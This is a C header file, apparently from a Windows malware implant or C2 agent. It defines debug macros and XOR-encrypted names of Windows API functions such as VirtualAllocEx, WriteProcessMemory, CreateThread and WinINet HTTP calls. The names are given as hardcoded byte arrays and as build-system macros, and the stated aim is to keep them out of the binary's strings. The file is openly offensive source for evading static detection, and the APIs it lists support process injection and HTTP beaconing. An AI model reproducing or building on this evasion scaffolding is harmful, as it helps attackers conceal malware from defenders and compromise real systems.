#pragma once

#include <windows.h> //for funcs section, like BYTE def, etc.

//================
// DEBUG
//================
#define DEBUG_PRINT 1 // Set to 1 for debug mode, 0 to disable
// [OPSEC: If this is on (1), plaintext debug strings will be included in the binary]

// TLDR: ChatGPT magic to make a print debug macro
#if DEBUG_PRINT
#define DEBUG_LOG(fmt, ...) printf("[DEBUG] " fmt "", ##__VA_ARGS__)
#define DEBUG_LOGW(fmt, ...) wprintf(L"[DEBUG] " fmt L"", ##__VA_ARGS__)
#define DEBUG_LOGF(stream, fmt, ...) fprintf(stream, "[DEBUG] " fmt "", ##__VA_ARGS__)
#else
#define DEBUG_LOG(fmt, ...) // No-op (does nothing)
#define DEBUG_LOGW(fmt, ...) // No-op (does nothing)
#define DEBUG_LOGF(stream, fmt, ...) // No-op (does nothing)
#endif


//================
// FUNCS
//================

#ifndef ENCRYPTION_FUNCTION_NAMES
/*
Encrypting function names, so they don't show up as strings in the binary.

They (technically) will show up in memory, but it shouldn't be for long. Have not 
verified/extensively tested this yet

Every whisper_winapi function that dynamically resolves the function, will need
the following entries:

 - FUNC_Whisper<FUNCNAME>_ENCRYPTED_NAME: XOR'd name of the function


NOTE!!!! YOU NEED 0x00 AS A NULL TERM AT THE END OF THE NAMES, otherwise 
the agent will keep reading past the name of the func.
*/

// ===============================
//OPTIONAL/DEBUG hardcoded Values:
// ===============================
//uncomment to disable the MACRO based replacement + key

// //key for unencrypting these names
// #define FUNC_ENCRYPTED_NAME_KEY 0x10
// //encrypted key name, used for finding func name in mem/keeping it out of strings
// // Encrypted function name (constant array), cannot macro an array in :(
// static const BYTE FUNC_WhisperMessageBoxA_ENCRYPTED_NAME[]  = { 0x5d, 0x75, 0x63, 0x63, 0x71, 0x77, 0x75, 0x52, 0x7f, 0x68, 0x51, 0x00 };
// static const BYTE FUNC_WhisperCreateThread_ENCRYPTED_NAME[] = { 0x53,0x62,0x75,0x71,0x64,0x75,0x44,0x78,0x62,0x75,0x71,0x74, 0x00};
// static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[]        = { 0x42,0x75,0x63,0x65,0x7d,0x75,0x44,0x78,0x62,0x75,0x71,0x74, 0x00};
// static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[]      = { 0x46,0x79,0x62,0x64,0x65,0x71,0x7c,0x51,0x7c,0x7c,0x7f,0x73,0x55,0x68, 0x00};
// static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[]  = { 0x47,0x62,0x79,0x64,0x75,0x40,0x62,0x7f,0x73,0x75,0x63,0x63,0x5d,0x75,0x7d,0x7f,0x62,0x69, 0x00};
// static const BYTE FUNC_CreatePipe_ENCRYPTED_NAME[]          = { 0x53,0x62,0x75,0x71,0x64,0x75,0x40,0x79,0x60,0x75, 0x00};
// static const BYTE FUNC_SetHandleInformation_ENCRYPTED_NAME[]= { 0x43,0x75,0x64,0x58,0x71,0x7e,0x74,0x7c,0x75,0x59,0x7e,0x76,0x7f,0x62,0x7d,0x71,0x64,0x79,0x7f,0x7e, 0x00};
// static const BYTE FUNC_CloseHandle_ENCRYPTED_NAME[]         = { 0x53,0x7c,0x7f,0x63,0x75,0x58,0x71,0x7e,0x74,0x7c,0x75, 0x00};
// static const BYTE FUNC_InternetOpenA_ENCRYPTED_NAME[]       = { 0x59,0x7e,0x64,0x75,0x62,0x7e,0x75,0x64,0x5f,0x60,0x75,0x7e,0x51, 0x00};
// static const BYTE FUNC_InternetConnectA_ENCRYPTED_NAME[]    = { 0x59,0x7e,0x64,0x75,0x62,0x7e,0x75,0x64,0x53,0x7f,0x7e,0x7e,0x75,0x73,0x64,0x51, 0x00};
// static const BYTE FUNC_HttpOpenRequestA_ENCRYPTED_NAME[]    = { 0x58, 0x64, 0x64, 0x60, 0x5f, 0x60, 0x75, 0x7e, 0x42, 0x75, 0x61, 0x65, 0x75, 0x63, 0x64, 0x51, 0x00 };
// static const BYTE FUNC_HttpSendRequestA_ENCRYPTED_NAME[]    = { 0x58, 0x64, 0x64, 0x60, 0x43, 0x75, 0x7e, 0x74, 0x42, 0x75, 0x61, 0x65, 0x75, 0x63, 0x64, 0x51, 0x00 };
// static const BYTE FUNC_InternetOpenUrlW_ENCRYPTED_NAME[]    = { 0x59, 0x7e, 0x64, 0x75, 0x62, 0x7e, 0x75, 0x64, 0x5f, 0x60, 0x75, 0x7e, 0x45, 0x62, 0x7c, 0x47, 0x00 };
// static const BYTE FUNC_InternetReadFile_ENCRYPTED_NAME[]    = { 0x59, 0x7e, 0x64, 0x75, 0x62, 0x7e, 0x75, 0x64, 0x42, 0x75, 0x71, 0x74, 0x56, 0x79, 0x7c, 0x75, 0x00 };
// static const BYTE FUNC_InternetCloseHandle_ENCRYPTED_NAME[] = { 0x59, 0x7e, 0x64, 0x75, 0x62, 0x7e, 0x75, 0x64, 0x53, 0x7c, 0x7f, 0x63, 0x75, 0x58, 0x71, 0x7e, 0x74, 0x7c, 0x75, 0x00 };
// static const BYTE FUNC_GetUserNameW_ENCRYPTED_NAME[]        = { 0x57, 0x75, 0x64, 0x45, 0x63, 0x75, 0x62, 0x5e, 0x71, 0x7d, 0x75, 0x47, 0x00 };
// static const BYTE FUNC_Sleep_ENCRYPTED_NAME[]               = { 0x43, 0x7c, 0x75, 0x75, 0x60, 0x00 };
// static const BYTE FUNC_WaitForSingleObject_ENCRYPTED_NAME[] = { 0x47, 0x71, 0x79, 0x64, 0x56, 0x7f, 0x62, 0x43, 0x79, 0x7e, 0x77, 0x7c, 0x75, 0x5f, 0x72, 0x7a, 0x75, 0x73, 0x64, 0x00 };
// static const BYTE FUNC_ReadFile_ENCRYPTED_NAME[]            = { 0x42, 0x75, 0x71, 0x74, 0x56, 0x79, 0x7c, 0x75, 0x00 };

// ===============================
// BUILD SYSTEM macro Values:
// Uncomment to enable build system XOR replacement
// ===============================
//key for unencrypting these names
#define FUNC_ENCRYPTED_NAME_KEY MACRO_FUNC_ENCRYPTED_NAME_KEY
//constants for each entry, XOR'd function names
static const BYTE FUNC_MessageBoxA_ENCRYPTED_NAME[]         = MACRO_FUNC_MessageBoxA_ENCRYPTED_NAME
static const BYTE FUNC_CreateThread_ENCRYPTED_NAME[]        = MACRO_FUNC_CreateThread_ENCRYPTED_NAME
static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[]        = MACRO_FUNC_ResumeThread_ENCRYPTED_NAME
static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[]      = MACRO_FUNC_VirtualAllocEx_ENCRYPTED_NAME
static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[]  = MACRO_FUNC_WriteProcessMemory_ENCRYPTED_NAME
static const BYTE FUNC_CreatePipe_ENCRYPTED_NAME[]          = MACRO_FUNC_CreatePipe_ENCRYPTED_NAME
static const BYTE FUNC_SetHandleInformation_ENCRYPTED_NAME[]= MACRO_FUNC_SetHandleInformation_ENCRYPTED_NAME
static const BYTE FUNC_CloseHandle_ENCRYPTED_NAME[]         = MACRO_FUNC_CloseHandle_ENCRYPTED_NAME
static const BYTE FUNC_InternetOpenA_ENCRYPTED_NAME[]       = MACRO_FUNC_InternetOpenA_ENCRYPTED_NAME
static const BYTE FUNC_InternetConnectA_ENCRYPTED_NAME[]    = MACRO_FUNC_InternetConnectA_ENCRYPTED_NAME
static const BYTE FUNC_HttpOpenRequestA_ENCRYPTED_NAME[]    = MACRO_FUNC_HttpOpenRequestA_ENCRYPTED_NAME
static const BYTE FUNC_HttpSendRequestA_ENCRYPTED_NAME[]    = MACRO_FUNC_HttpSendRequestA_ENCRYPTED_NAME
static const BYTE FUNC_InternetOpenUrlW_ENCRYPTED_NAME[]    = MACRO_FUNC_InternetOpenUrlW_ENCRYPTED_NAME
static const BYTE FUNC_InternetReadFile_ENCRYPTED_NAME[]    = MACRO_FUNC_InternetReadFile_ENCRYPTED_NAME
static const BYTE FUNC_InternetCloseHandle_ENCRYPTED_NAME[] = MACRO_FUNC_InternetCloseHandle_ENCRYPTED_NAME
static const BYTE FUNC_GetUserNameW_ENCRYPTED_NAME[]        = MACRO_FUNC_GetUserNameW_ENCRYPTED_NAME
static const BYTE FUNC_Sleep_ENCRYPTED_NAME[]               = MACRO_FUNC_Sleep_ENCRYPTED_NAME
static const BYTE FUNC_WaitForSingleObject_ENCRYPTED_NAME[] = MACRO_FUNC_WaitForSingleObject_ENCRYPTED_NAME
static const BYTE FUNC_ReadFile_ENCRYPTED_NAME[]            = MACRO_FUNC_ReadFile_ENCRYPTED_NAME

#endif //ENCRYPTION_FUNCTION_NAMES
